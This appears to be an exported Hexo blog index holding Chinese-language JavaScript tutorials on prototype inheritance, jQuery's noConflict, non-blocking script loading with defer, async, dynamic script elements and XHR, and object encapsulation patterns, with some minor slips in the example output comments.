    <content type="text"><![CDATA[&emsp;&emsp;我觉得阅读精彩的文章是提升自己最快的方法，而且我发现人在不同阶段看待同样的东西都会有不同的收获，有一天你看到一本好书或者好的文章，请记得收藏起来，隔断时间再去看看，我想应该会有很大的收获。其实今天要讨论的主题，有许多人写过许多精彩的文章，但是今天我还是想把自己的理解的知识记录下来。希望我修正后的继承能让更多人对JS有更深的理解。接下来我们从最基本的东西讲到最难的，希望能帮助大家更好的理解。原型写法和用法123456789101112131415function Cat()&#123; this.Color = "black"; this.eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var cat1 = new Cat();cat1.eat(); //吃老鼠cat1.A(); //Cat A&emsp;&emsp;上面这种写法是我们熟知的工厂模式，这种模式我觉得应该算是标准的原型写法。但是一般我不会使用这种写法，我会用直接量来写实现上面的方法，因为使用函数封装方法我个人感觉是很危险的，因为函数写法相当于是一个全局方法，他的执行顺序也是优先级最高的，这种方法不利于在大的项目中管理，所以一般用直接量，直接量最大的好处是只有当代码执行到这段代码后才会开始运行。接下来我们修改下上面的代码：123456789101112131415var Cat = function()&#123; this.Color = "black"; this.eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var cat1 = new Cat();cat1.eat(); //吃老鼠cat1.A(); //Cat A使用原型扩展提高性能&emsp;&emsp;可能很多人会无法理解为什么我们要通过prototype来输入方法，也听过看过很多人说直接使用函数的效率是最低的，但是不知道原理。其实我们拿上面的案例做个简单的实验你或许就能懂了：12345678910111213141516var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;var cat1 = new Cat();var cat2 = new Cat();alert(cat1.Eat == cat2.Eat) // falsealert(cat1.A == cat2.A) // true&emsp;&emsp;看到结果是否很震惊，Eat和A方法都是Cat对象里面的，为什么两个实例一对比会产生不同的结果呢？在JS原型链中，通过prototype声明的方法会被存入内存中，不管我们实例化多少次Cat访问通过prototype扩展的A或者B方法，他们都是去读取同一个内存，但是Cat自身的属性和方法却不是这样，而是每次都会跟着实例化，如果该对象被频繁调用，那将会占用大量的内存，这就是为什么我们用prototype来扩展我们对象的属性和方法。构造函数&emsp;&emsp;上面这两种写法都是标准的原型写法，每个原型都有一个构造函数，每个原型的实例也都有一个构造函数。这个知识点非常的关键，这个构造函数你可以理解为和我们的身份证一样，每个原型构造函数都是唯一的，我们不能随意的去改变他们的身份证。我们来检测下上面的代码的构造函数。12345678910111213141516var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var cat1 = new Cat();console.log(Cat.prototype.constructor == Cat); //trueconsole.log(cat1.constructor == Cat); //trueconsole.log(cat1.constructor == Cat.prototype.constructor); //true&emsp;&emsp;可能看到上面的有些人会说，你不是说每个构造函数都是一个身份证吗？为啥cat1的构造函数和Cat构造函数一样呢，坑爹吧。别急，这就是JS这门有趣的原因之一，cat1我们专业名词称它是Cat的实例，他们的构造函数是共享的。你也可以把cat1理解为Cat的一个复制品，或者说克隆人。我们可以无限复制Cat出来。1234var cat1 = new Cat();cat1.Eat(); //吃老鼠var cat2 = new Cat();cat2.Eat(); //吃老鼠Cat的复制品的构造函数是都指向Cat本身的，记住这点。原型继承&emsp;&emsp;我觉得要正真理解原型链就需要先理解原型继承的原理，理解了如何继承，基本上你就对原型链掌握很深了。我们来实现一个简单的原型继承，我通过阮老师的文章中写的直接继承prototype来实现继承，修改上面的代码：1234567891011121314151617181920var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var Dog = function()&#123; this.Weight = "30";&#125;Dog.prototype = Cat.prototype;console.log(Dog.prototype.constructor == Cat); // truevar dog1 = new Dog();dog1.A(); // Cat Adog1.B(); // Cat B&emsp;&emsp;上面的代码，我设置了一个Dog来继承Cat,我们使用prototype来实现继承，实际继承成功了,Dog的实例dog1调用了Cat里面的prototype的A和B方法。但是这里出了一个小问题，通过prototype继承导致了Dog的构造函数发生了改变，导致它指向了Cat，这就是我们代码中console输出的原因。我们上面说过每个原型都有一个自己的独立的构造函数，我们却改变了它，这样会导致原型混乱，所以我们必须把Dog的构造函数指回Dog本身。所以修改下代码：12345678910111213141516171819202122var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var Dog = function()&#123; this.Weight = "30";&#125;Dog.prototype = Cat.prototype;Dog.prototype.constructor = Dog;console.log(Dog.prototype.constructor == Cat); // falseconsole.log(Cat.prototype.constructor == Dog); // truevar dog1 = new Dog();dog1.A(); // Cat Adog1.B(); // Cat B&emsp;&emsp;上面我通过Dog.prototype.constructor = Dog;这句话把Dog构造函数指回自己了，但是坑爹的是这样做之后，原先的Cat的构造函数也被改变成了Dog，唉，这是要闹哪样，完全坑爹，所以这种继承方式也是失败的，但是我们已经接近成功了，阮老师后面提出了利用空对象作为中介来继承。好的的直接上代码：12345678910111213141516171819202122232425var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var Dog = function()&#123; this.Weight = "30";&#125;var Fn = function()&#123;&#125;;Fn.prototype = Cat.prototype;Dog.prototype = new Fn();Dog.prototype.constructor = Dog;console.log(Dog.prototype.constructor == Dog); // trueconsole.log(Cat.prototype.constructor == Cat); // truevar dog1 = new Dog();dog1.A(); // Cat Adog1.B(); // Cat B&emsp;&emsp;这下实现完美的继承了，上面是我根据阮老师的提供的方式实现的一个继承，Dog不止继承了Cat里面的prototype的方法，而且构造函数还是指回自己，Cat的构造函数也没被篡改。貌似非常完美的继承。但…..prototype继承缺陷&emsp;&emsp;上面的通过原型继承看起来很完美，但是还是有缺陷，并不是说@阮老师的方法有问题，他的继承方法是没问题的，但是只能针对空对象继承。&emsp;&emsp;实际上通过prototype继承，他只能继承对象通过prototype的属性和方法，他无法继承对象本身的属性，举个例子：1234567891011121314151617181920212223242526var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var Dog = function()&#123; this.Weight = "30";&#125;var Fn = function()&#123;&#125;;Fn.prototype = Cat.prototype;Dog.prototype = new Fn();Dog.prototype.constructor = Dog;console.log(Dog.prototype.constructor == Dog); // trueconsole.log(Cat.prototype.constructor == Cat); // truevar dog1 = new Dog();dog1.A(); // Cat Adog1.B(); // Cat Bconsole.log(dog1.Color);//undefineddog1.Eat();//has no method 'Eat'&emsp;&emsp;我们在之前的代码里面调用了我们继承Cat的方法和属性，但是只有Cat里面的A和B方法被调用成功了，但是Cat的自身属性里面的Color和Eat方法都没调用成功，说明咱们根本没有继承到他自身的属性，只继承了通过prototype扩展的方法，这就是JS原型链的奇特现象之一，这种原型继承的缺陷貌似阮一峰老师也没发现。所以我针对上面的方法做了些修改：12345678910111213141516171819202122232425var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;;var Dog = function()&#123; this.Weight = "30";&#125;Dog.prototype = new Cat();Dog.prototype.constructor = Dog;console.log(Dog.prototype.constructor == Dog); // trueconsole.log(Cat.prototype.constructor == Cat); // truevar dog1 = new Dog();alert(Dog.Weight);// 30dog1.A(); // Cat Adog1.B(); // Cat Balert(dog1.Color);//blackdog1.Eat();//吃老鼠&emsp;&emsp;上面的我将继承者Dog的原型直接指向了Cat的实例，然后再将Dog的构造函数指回本身，这样就可以实现完整的继承了，Dog不仅仅继承了Cat的prototype而已还继承了Cat本身自带的属性和方法。在上面中我们知道Cat的实例cat1其实就是包含了Cat所有的属性和方法，他不会区分你是不是在原型中的方法还是在自身中的方法，都会完全被复制到实例中，所以我们直接去继承实例，这样子就可以直接获取到Cat中所有的方法和属性。而且直接继承实例我感觉也更加安全且高效，因为不去直接操作原型本身，只是操作原型实例。通过深拷贝实现完美继承&emsp;&emsp;其实上面的方法离完美的继承方式还是存在着一个缺陷的。我们的的继承者Dog如果他现在里面存在着原型方法的时候，我们又想让她保留现在的原型方法情况下，还可以去继承Cat里面的所有方法怎么办，用上面的方法是无法实现的，请看代码：123456789101112131415161718192021222324252627var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype =&#123; A:function()&#123; alert("Cat A"); &#125;, B:function()&#123; alert("Cat B"); &#125;&#125;var Dog = function()&#123; this.Weight = "30";&#125;Dog.prototype.testDog = function()&#123; alert("test Dog");&#125;Dog.prototype = new Cat();Dog.prototype.constructor = Dog;var dog1 = new Dog();alert(dog1.Weight);//30dog1.testDog();//has no method 'testDog'&emsp;&emsp;看上面的代码，我只是在继承者Dog的原型里面添加了一个testDog的方法，然后Dog用我们上面的方法去继承Cat后，Dog自身的属性Weight在继承Cat的过程中也被保留下来了，但是Dog存在原型链中的testDog却在继承过程中被干掉了，无言，心碎。这个时候我想到了阮一峰老师的拷贝继承，他的拷贝继承依然是存在的缺陷，但是我直接改进了他的方法，那样实现了完美的继承：123456789101112131415161718192021222324252627282930313233var Cat = function()&#123; this.Color = "black"; this.Eat = function()&#123; alert("吃老鼠"); &#125;;&#125;Cat.prototype.A = function()&#123; alert("Cat A");&#125;;Cat.prototype.B = function()&#123; alert("Cat B");&#125;var Dog = function()&#123; this.Weight = "30";&#125;Dog.prototype.testDog = function()&#123; alert("test Dog");&#125;var extend = function(Child,Parent)&#123; var p = new Parent(); var c = Child.prototype; for (var i in p) &#123; c[i] = p[i]; &#125; c.uber = p;&#125;//用我们写好的继承方法执行继承extend(Dog,Cat);var dog1 = new Dog();dog1.A(); // Cat Adog1.Eat(); // 吃老鼠dog1.testDog(); // test Dogalert(dog1.Weight); // 30&emsp;&emsp;其实上面我们extend方法中我只是通过了for..in去遍历Cat生成的实例中的所有属性和方法，然后将这些值复制到我们的Dog中，这样子就可以实现保留本身属性又继承，这种方法是应该算是最优的解决方法。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js继承</tag>
        <tag>js原型链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery 中的防冲突（noConflict）机制]]></title>
    <url>%2F2015%2F07%2F17%2Fjquery-%E4%B8%AD%E7%9A%84%E9%98%B2%E5%86%B2%E7%AA%81%EF%BC%88noconflict%EF%BC%89%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[许多的 JS 框架类库都选择使用 $ 符号作为函数或变量名，jQuery 是其中最为典型的一个。在 jQuery 中，$ 符号只是 window.jQuery 对象的一个引用，因此即使 $ 被删除，window.jQuery 依然是保证整个类库完整性的坚强后盾。jQuery 的 API 设计充分考虑了多框架之间的引用冲突，我们可以使用 jQuery.noConflict 方法来轻松实现控制权的移交。jQuery.noConflict 方法包含一个可选的布尔参数[1]，用以决定移交 $ 引用的同时是否移交jQuery对象本身：12345缺省情况下，执行 noConflict 会将变量 $ 的控制权移交给第一个产生 $ 的库；当 removeAll 设置为 true 时，执行 noConflict 则会将 $ 和 jQuery 对象本身的控制权全部移交给第一个产生他们的库。例如在 KISSY 和 jQuery 混用，并且惯用 $ = KISSY 来简化 API 操作的时候，就能够通过这个方法解决命名冲突的问题。那么这个机制是如何实现的呢？阅读 jQuery 源码开头[2]，首先做的一件事情是这样的：// Map over jQuery in case of overwrite_jQuery = window.jQuery,// Map over the $ in case of overwrite_$ = window.$,1234567891011容易理解的是，jQuery 通过两个私有变量映射了 window 环境下的 jQuery 和 $ 两个对象，以防止变量被强行覆盖。一旦 noConflict 方法被调用，则通过 _jQuery, _$, jQuery, $ 四者之间的差异，来决定控制权的移交方式，具体的代码如下：```javascriptnoConflict: function( deep ) &#123; if ( window.$ === jQuery ) &#123; window.$ = _$; &#125; if ( deep &amp;amp;&amp;amp; window.jQuery === jQuery ) &#123; window.jQuery = _jQuery; &#125; return jQuery;&#125;再来看上面所说的参数设定问题，如果 deep 没有设置，_$ 覆盖 window.$，此时 jQuery 别名 $ 失效，但 jQuery 本身完好无损。如果有其他类库或代码重新定义了 $ 变量，它的控制权就完全交接出去了。反之如果 deep 设置为 true 的话，_jQuery 覆盖 window.jQuery，此时 $ 和 jQuery 都将失效。这种操作的好处是，不管是框架混用还是 jQuery 多版本共存这种高度冲突的执行环境，由于 noConflict 方法提供的移交机制，以及本身返回未被覆盖的 jQuery 对象，完全能够通过变量映射的方式解决冲突。但无法避免的事实是可能导致的插件失效等问题，当然通过简单修改上下文参数即可恢复 $ 别名：1234var query = jQuery.noConflict(true);(function ($) &#123; // 插件或其他形式的代码，也可以将参数设为 jQuery&#125;)(query);]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>noConflict</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Javascript性能优化之异步加载和执行]]></title>
    <url>%2F2015%2F07%2F17%2Fjavascript%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E4%B9%8B%E5%BC%82%E6%AD%A5%E5%8A%A0%E8%BD%BD%E5%92%8C%E6%89%A7%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[随着科技的发展，如今的网站和五六年前相比，现在的人们对web的要求越来越高了，用户体验，交互效果，视觉效果等等都有很高的要求，要实现这些功能我们最就需要用到javascript，这时候JS的性能优化就越来越重要了，今天在这里给大家转载一篇IBM开发人员写的怎么优化javascript文章，我觉得写的挺好，希望对大家有所帮助。无论当前JavaScript代码是内嵌还是在外链文件中，页面的下载和渲染都必须停下来等待脚本执行完成。JavaScript执行过程耗时越久，浏览器等待响应用户输入的时间就越长。浏览器在下载和执行脚本时出现阻塞的原因在于，脚本可能会改变页面或JavaScript的命名空间，它们对后面页面内容造成影响。一个典型的例子就是在页面中使用document.write()。JavaScript 代码内嵌示例123456789101112&lt;html&gt;&lt;head&gt; &lt;title&gt;Source Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; &lt;script type="text/javascript"&gt; document.write("Today is " + (new Date()).toDateString()); &lt;/script&gt; &lt;/p&gt;&lt;/body&gt;&lt;/html&gt;当浏览器遇到script标签时，当前 HTML 页面无从获知 JavaScript 是否会向&lt;p&gt;标签添加内容，或引入其他元素，或甚至移除该标签。因此，这时浏览器会停止处理页面，先执行JavaScript代码，然后再继续解析和渲染页面。同样的情况也发生在使用 src 属性加载JavaScript的过程中，浏览器必须先花时间下载外链文件中的代码，然后解析并执行它。在这个过程中，页面渲染和用户交互完全被阻塞了。脚本位置HTML 4 规范指出 script 标签可以放在 HTML 文档的head或body中，并允许出现多次。Web 开发人员一般习惯在 head 中加载外链的 JavaScript，接着用 &lt;link&gt; 标签用来加载外链的 CSS 文件或者其他页面信息。123456789101112&lt;html&gt;&lt;head&gt; &lt;title&gt;Source Example&lt;/title&gt; &lt;script type="text/javascript" src="script1.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="script2.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="script3.js"&gt;&lt;/script&gt; &lt;link rel="stylesheet" type="text/css" href="styles.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Hello world!&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;然而这种常规的做法却隐藏着严重的性能问题。在清单 2 的示例中，当浏览器解析到 script 标签（第 4 行）时，浏览器会停止解析其后的内容，而优先下载脚本文件，并执行其中的代码，这意味着，其后的 styles.css 样式文件和body标签都无法被加载，由于body标签无法被加载，那么页面自然就无法渲染了。因此在该 JavaScript 代码完全执行完之前，页面都是一片空白。从 IE 8、Firefox 3.5、Safari 4 和 Chrome 2 开始都允许并行下载 JavaScript 文件。这是个好消息，因为script标签在下载外部资源时不会阻塞其他script标签。遗憾的是，JavaScript 下载过程仍然会阻塞其他资源的下载，比如样式文件和图片。尽管脚本的下载过程不会互相影响，但页面仍然必须等待所有 JavaScript 代码下载并执行完成才能继续。因此，尽管最新的浏览器通过允许并行下载提高了性能，但问题尚未完全解决，脚本阻塞仍然是一个问题。我们可以发现一个有趣的现象：第一个 JavaScript 文件开始下载，与此同时阻塞了页面其他文件的下载。此外，从 script1.js 下载完成到 script2.js 开始下载前存在一个延时，这段时间正好是 script1.js 文件的执行过程。每个文件必须等到前一个文件下载并执行完成才会开始下载。在这些文件逐个下载过程中，用户看到的是一片空白的页面。由于脚本会阻塞页面其他资源的下载，因此推荐将所有script标签尽可能放到body标签的底部，以尽量减少对整个页面下载的影响。请看下面推荐的代码放置位置示例1234567891011121314&lt;html&gt;&lt;head&gt; &lt;title&gt;Source Example&lt;/title&gt; &lt;link rel="stylesheet" type="text/css" href="styles.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;Hello world!&lt;/p&gt; &lt;!-- Example of efficient script positioning --&gt; &lt;script type="text/javascript" src="script1.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="script2.js"&gt;&lt;/script&gt; &lt;script type="text/javascript" src="script3.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;这段代码展示了在 HTML 文档中放置script标签的推荐位置。尽管脚本下载会阻塞另一个脚本，但是页面的大部分内容都已经下载完成并显示给了用户，因此页面下载不会显得太慢。这是优化 JavaScript 的首要规则：将脚本放在底部。组织脚本由于每个script标签初始下载时都会阻塞页面渲染，所以减少页面包含的script标签数量有助于改善这一情况。这不仅针对外链脚本，内嵌脚本的数量同样也要限制。浏览器在解析 HTML 页面的过程中每遇到一个script标签，都会因执行脚本而导致一定的延时，因此最小化延迟时间将会明显改善页面的总体性能。这个问题在处理外链 JavaScript 文件时略有不同。考虑到 HTTP 请求会带来额外的性能开销，因此下载单个 100Kb 的文件将比下载 5 个 20Kb 的文件更快。也就是说，减少页面中外链脚本的数量将会改善性能。通常一个大型网站或应用需要依赖数个 JavaScript 文件。您可以把多个文件合并成一个，这样只需要引用一个script标签，就可以减少性能消耗。文件合并的工作可通过离线的打包工具或者一些实时的在线服务来实现。需要特别提醒的是，把一段内嵌脚本放在引用外链样式表的link之后会导致页面阻塞去等待样式表的下载。这样做是为了确保内嵌脚本在执行时能获得最精确的样式信息。因此，建议不要把内嵌脚本紧跟在link标签后面。无阻塞的脚本减少 JavaScript 文件大小并限制 HTTP 请求数在功能丰富的 Web 应用或大型网站上并不总是可行。Web 应用的功能越丰富，所需要的 JavaScript 代码就越多，尽管下载单个较大的 JavaScript 文件只产生一次 HTTP 请求，却会锁死浏览器的一大段时间。为避免这种情况，需要通过一些特定的技术向页面中逐步加载 JavaScript 文件，这样做在某种程度上来说不会阻塞浏览器。无阻塞脚本的秘诀在于，在页面加载完成后才加载 JavaScript 代码。这就意味着在 window 对象的 onload事件触发后再下载脚本。有多种方式可以实现这一效果。延迟加载脚本HTML 4 为script标签定义了一个扩展属性：defer。Defer 属性指明本元素所含的脚本不会修改 DOM，因此代码能安全地延迟执行。defer 属性只被 IE 4 和 Firefox 3.5 更高版本的浏览器所支持，所以它不是一个理想的跨浏览器解决方案。在其他浏览器中，defer 属性会被直接忽略，因此script标签会以默认的方式处理，也就是说会造成阻塞。然而，如果您的目标浏览器支持的话，这仍然是个有用的解决方案。请看代码：1&lt;script type="text/javascript" src="script1.js" defer&gt;&lt;/script&gt;带有 defer 属性的script标签可以放置在文档的任何位置。对应的 JavaScript 文件将在页面解析到script标签时开始下载，但不会执行，直到 DOM 加载完成，即onload事件触发前才会被执行。当一个带有 defer 属性的 JavaScript 文件下载时，它不会阻塞浏览器的其他进程，因此这类文件可以与其他资源文件一起并行下载。任何带有 defer 属性的script元素在 DOM 完成加载之前都不会被执行，无论内嵌或者是外链脚本都是如此。123456789101112131415161718&lt;html&gt;&lt;head&gt; &lt;title&gt;Script Defer Example&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script type="text/javascript" defer&gt; alert("defer"); &lt;/script&gt; &lt;script type="text/javascript"&gt; alert("script"); &lt;/script&gt; &lt;script type="text/javascript"&gt; window.onload = function()&#123; alert("load"); &#125;; &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;这段代码在页面处理过程中弹出三次对话框。不支持 defer 属性的浏览器的弹出顺序是：“defer”、“script”、“load”。而在支持 defer 属性的浏览器上，弹出的顺序则是：“script”、“defer”、“load”。请注意，带有 defer 属性的script元素不是跟在第二个后面执行，而是在 onload 事件被触发前被调用。如果您的目标浏览器只包括 Internet Explorer 和 Firefox 3.5，那么 defer脚本确实有用。如果您需要支持跨领域的多种浏览器，那么还有更一致的实现方式。HTML 5 为script标签定义了一个新的扩展属性：async。它的作用和 defer 一样，能够异步地加载和执行脚本，不因为加载脚本而阻塞页面的加载。但是有一点需要注意，在有 async 的情况下，JavaScript 脚本一旦下载好了就会执行，所以很有可能不是按照原本的顺序来执行的。如果 JavaScript 脚本前后有依赖性，使用 async 就很有可能出现错误。动态脚本元素文档对象模型（DOM）允许您使用 JavaScript 动态创建 HTML 的几乎全部文档内容。script元素与页面其他元素一样，可以非常容易地通过标准 DOM 函数创建：1234var script = document.createElement ("script"); script.type = "text/javascript"; script.src = "script1.js"; document.getElementsByTagName("head")[0].appendChild(script);新的script元素加载 script1.js 源文件。此文件当元素添加到页面之后立刻开始下载。此技术的重点在于：无论在何处启动下载，文件的下载和运行都不会阻塞其他页面处理过程。您甚至可以将这些代码放在head部分而不会对其余部分的页面代码造成影响（除了用于下载文件的 HTTP 连接）。当文件使用动态脚本节点下载时，返回的代码通常立即执行（除了 Firefox 和 Opera，他们将等待此前的所有动态脚本节点执行完毕）。当脚本是“自运行”类型时，这一机制运行正常，但是如果脚本只包含供页面其他脚本调用调用的接口，则会带来问题。这种情况下，您需要跟踪脚本下载完成并是否准备妥善。可以使用动态 script 节点发出事件得到相关信息。Firefox、Opera, Chorme 和 Safari 3+会在script节点接收完成之后发出一个 onload 事件。您可以监听这一事件，以得到脚本准备好的通知：12345678var script = document.createElement ("script")script.type = "text/javascript";//Firefox, Opera, Chrome, Safari 3+script.onload = function()&#123; alert("Script loaded!");&#125;;script.src = "script1.js";document.getElementsByTagName("head")[0].appendChild(script);Internet Explorer 支持另一种实现方式，它发出一个 readystatechange 事件。script元素有一个 readyState 属性，它的值随着下载外部文件的过程而改变。readyState 有五种取值：“uninitialized”：默认状态“loading”：下载开始“loaded”：下载完成“interactive”：下载完成但尚不可用“complete”：所有数据已经准备好微软文档上说，在script元素的生命周期中，readyState 的这些取值不一定全部出现，但并没有指出哪些取值总会被用到。实践中，我们最感兴趣的是“loaded”和“complete”状态。Internet Explorer 对这两个 readyState 值所表示的最终状态并不一致，有时script元素会得到“loader”却从不出现“complete”，但另外一些情况下出现“complete”而用不到“loaded”。最安全的办法就是在 readystatechange 事件中检查这两种状态，并且当其中一种状态出现时，删除 readystatechange 事件句柄（保证事件不会被处理两次）：通过检查 readyState 状态加载 JavaScript 脚本：1234567891011var script = document.createElement("script")script.type = "text/javascript";//Internet Explorerscript.onreadystatechange = function()&#123; if (script.readyState == "loaded" || script.readyState == "complete")&#123; script.onreadystatechange = null; alert("Script loaded."); &#125;&#125;;script.src = "script1.js";document.getElementsByTagName("head")[0].appendChild(script);大多数情况下，您希望调用一个函数就可以实现 JavaScript 文件的动态加载。下面的函数封装了标准实现和 IE 实现所需的功能：通过函数进行封装：123456789101112131415161718function loadScript(url, callback)&#123; var script = document.createElement ("script") script.type = "text/javascript"; if (script.readyState)&#123; //IE script.onreadystatechange = function()&#123; if (script.readyState == "loaded" || script.readyState == "complete")&#123; script.onreadystatechange = null; callback(); &#125; &#125;; &#125; else &#123; //Others script.onload = function()&#123; callback(); &#125;; &#125; script.src = url; document.getElementsByTagName("head")[0].appendChild(script);&#125;此函数接收两个参数：JavaScript 文件的 URL，和一个当 JavaScript 接收完成时触发的回调函数。属性检查用于决定监视哪种事件。最后一步，设置 src 属性，并将script元素添加至页面。此 loadScript() 函数使用方法如下：123loadScript("script1.js", function()&#123; alert("File is loaded!");&#125;);您可以在页面中动态加载很多 JavaScript 文件，但要注意，浏览器不保证文件加载的顺序。所有主流浏览器之中，只有 Firefox 和 Opera 保证脚本按照您指定的顺序执行。其他浏览器将按照服务器返回它们的次序下载并运行不同的代码文件。您可以将下载操作串联在一起以保证他们的次序，如下：1234567loadScript("script1.js", function()&#123; loadScript("script2.js", function()&#123; loadScript("script3.js", function()&#123; alert("All files are loaded!"); &#125;); &#125;);&#125;);此代码等待 script1.js 可用之后才开始加载 script2.js，等 script2.js 可用之后才开始加载 script3.js。虽然此方法可行，但如果要下载和执行的文件很多，还是有些麻烦。如果多个文件的次序十分重要，更好的办法是将这些文件按照正确的次序连接成一个文件。独立文件可以一次性下载所有代码（由于这是异步进行的，使用一个大文件并没有什么损失）。动态脚本加载是非阻塞 JavaScript 下载中最常用的模式，因为它可以跨浏览器，而且简单易用。使用 XMLHttpRequest(XHR)对象此技术首先创建一个 XHR 对象，然后下载 JavaScript 文件，接着用一个动态 script 元素将 JavaScript 代码注入页面。通过 XHR 对象加载 JavaScript 脚本：12345678910111213var xhr = new XMLHttpRequest();xhr.open("get", "script1.js", true);xhr.onreadystatechange = function()&#123; if (xhr.readyState == 4)&#123; if (xhr.status &gt;= 200 &amp;amp;&amp;amp; xhr.status &lt; 300 || xhr.status == 304)&#123; var script = document.createElement ("script"); script.type = "text/javascript"; script.text = xhr.responseText; document.body.appendChild(script); &#125; &#125;&#125;;xhr.send(null);此代码向服务器发送一个获取 script1.js 文件的 GET 请求。onreadystatechange 事件处理函数检查 readyState 是不是 4，然后检查 HTTP 状态码是不是有效（2XX 表示有效的回应，304 表示一个缓存响应）。如果收到了一个有效的响应，那么就创建一个新的script元素，将它的文本属性设置为从服务器接收到的 responseText 字符串。这样做实际上会创建一个带有内联代码的script元素。一旦新script元素被添加到文档，代码将被执行，并准备使用。这种方法的主要优点是，您可以下载不立即执行的 JavaScript 代码。由于代码返回在script标签之外（换句话说不受script标签约束），它下载后不会自动执行，这使得您可以推迟执行，直到一切都准备好了。另一个优点是，同样的代码在所有现代浏览器中都不会引发异常。此方法最主要的限制是：JavaScript 文件必须与页面放置在同一个域内，不能从 CDN 下载（CDN 指”内容投递网络（Content Delivery Network）”，所以大型网页通常不采用 XHR 脚本注入技术。总结减少 JavaScript 对性能的影响有以下几种方法：1.将所有的2.尽可能地合并脚本。页面中的3.采用无阻塞下载 JavaScript 脚本的方法：3.1.使用3.2.使用动态创建的3.3.使用 XHR 对象下载 JavaScript 代码并注入页面中。3.4.通过以上策略，可以在很大程度上提高那些需要使用大量 JavaScript 的 Web 网站和应用的实际性能。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>Javascript性能优化</tag>
        <tag>异步加载执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[javascript面向对象编程之封装方法]]></title>
    <url>%2F2015%2F07%2F17%2Fjavascript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B%E4%B9%8B%E5%B0%81%E8%A3%85%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Javascript是一种基于对象（object-based）的语言，你遇到的所有东西几乎都是对象。但是，它又不是一种真正的面向对象编程（OOP）语言，因为它的语法中没有class（类）。但是如果要把”属性”（property）和”方法”（method），封装成一个对象，甚至要从原型对象生成一个实例对象，应该怎么做呢？今天我就简单给大家解释一下方法。1、生成对象的原始模式假定我们把狗看成一个对象，它有”名字”和”颜色”两个属性。1234var Dog = &#123; name:'', color:''&#125;现在，我们需要根据这个原型对象的规格（schema），生成两个实例对象。123456var Dog1 = &#123;&#125;; // 创建一个空对象 Dog1.name = "大黄"; // 按照原型对象的属性赋值 Dog1.color = "黄色";var Dog2 = &#123;&#125;; Dog2.name = "二黄"; Dog2.color = "黑色";好了，这就是最简单的封装了，把两个属性封装在一个对象里面。但是，这样的写法有两个缺点：是如果多生成几个实例，写起来就非常麻烦是实例与原型之间，没有任何办法，可以看出有什么联系。2.原始模式的改进我们可以写一个函数，解决代码重复的问题。123456function Dog(name,color)&#123; return &#123; name:name, color:color &#125;&#125;然后生成实例对象，就等于是在调用函数：12var dog1 = Dog("大黄","黄色");var dog2 = Dog("二黄","黑色");这种方法的缺点还是dog1和cat2之间并没有内在的联系，不能反映出它们是同一个原型对象的实例。3.构造函数模式为了解决从原型对象生成实例的问题，Javascript提供了一个构造函数（Constructor）模式。所谓”构造函数”，其实就是一个普通函数，但是内部使用了this变量。对构造函数使用new运算符，就能生成实例，并且this变量会绑定在实例对象上。例如：狗的原型对象现在可以这样写：1234function Dog(name,color)&#123; this.name=name; this.color=color;&#125;我们现在就可以生成实例对象了。1234var Dog1 = new Dog("大黄","黄色");var Dog2 = new Dog("二黄","黑色");alert(Dog1.name); // 大毛alert(Dog1.color); // 黄色这时Dog1和Dog2会自动含有一个constructor属性，指向它们的构造函数。12alert(Dog1.constructor == Dog); //truealert(Dog2.constructor == Dog); 